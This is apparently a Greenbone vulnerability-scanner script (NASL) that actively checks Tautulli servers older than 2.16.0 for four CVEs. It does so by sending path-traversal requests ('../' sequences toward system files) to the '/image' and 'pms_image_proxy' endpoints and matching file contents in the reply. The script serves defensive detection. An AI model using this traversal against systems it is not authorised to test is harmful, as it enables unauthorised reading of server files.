# SPDX-FileCopyrightText: 2025 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:tautulli:tautulli";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.155328");
  script_version("2025-09-19T05:38:25+0000");
  script_tag(name:"last_modification", value:"2025-09-19 05:38:25 +0000 (Fri, 19 Sep 2025)");
  script_tag(name:"creation_date", value:"2025-09-15 08:30:29 +0000 (Mon, 15 Sep 2025)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2025-09-18 17:23:40 +0000 (Thu, 18 Sep 2025)");

  script_cve_id("CVE-2025-58760", "CVE-2025-58761", "CVE-2025-58762", "CVE-2025-58763");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Tautulli < 2.16.0 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2025 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_tautulli_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("tautulli/http/detected");
  script_require_ports("Services/www", 8181);

  script_tag(name:"summary", value:"Tautulli is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The following flaws exist:

  - CVE-2025-58760: Unauthenticated path traversal in '/image' endpoint

  - CVE-2025-58761: Unauthenticated path traversal in 'real_pms_image_proxy'

  - CVE-2025-58762: Authenticated remote code execution (RCE) via write primitive and 'Script'
  notification agent

  - CVE-2025-58763: Authenticated remote code execution (RCE) via command injection");

  script_tag(name:"affected", value:"Tautulli version 2.15.3 and prior.");

  script_tag(name:"solution", value:"Update to version 2.16.0 or later.");

  script_xref(name:"URL", value:"https://github.com/Tautulli/Tautulli/security/advisories/GHSA-8g4r-8f3f-hghp");
  script_xref(name:"URL", value:"https://github.com/Tautulli/Tautulli/security/advisories/GHSA-r732-m675-wj7w");
  script_xref(name:"URL", value:"https://github.com/Tautulli/Tautulli/security/advisories/GHSA-pxhr-29gv-4j8v");
  script_xref(name:"URL", value:"https://github.com/Tautulli/Tautulli/security/advisories/GHSA-jrm9-r57q-6cvf");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("traversal_func.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

urls = make_list("/image/images/",
                 "/pms_image_proxy?img=interfaces/default/images/");

files = traversal_files();

foreach base_url (urls) {
  foreach pattern (keys(files)) {
    url = dir + base_url + crap(length: 10 * 3, data: "../") + files[pattern];

    req = http_get(port: port, item: url);
    res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

    if (egrep(pattern: pattern, string: res)) {
      report = "It was possible to obtain the file '" + files[pattern] + "' via " +
               http_report_vuln_url(port: port, url: url, url_only: TRUE) +
               '\n\nResult:\n\n' + chomp(res);
      security_message(port: port, data: report);
      exit(0);
    }
  }
}

exit(0);
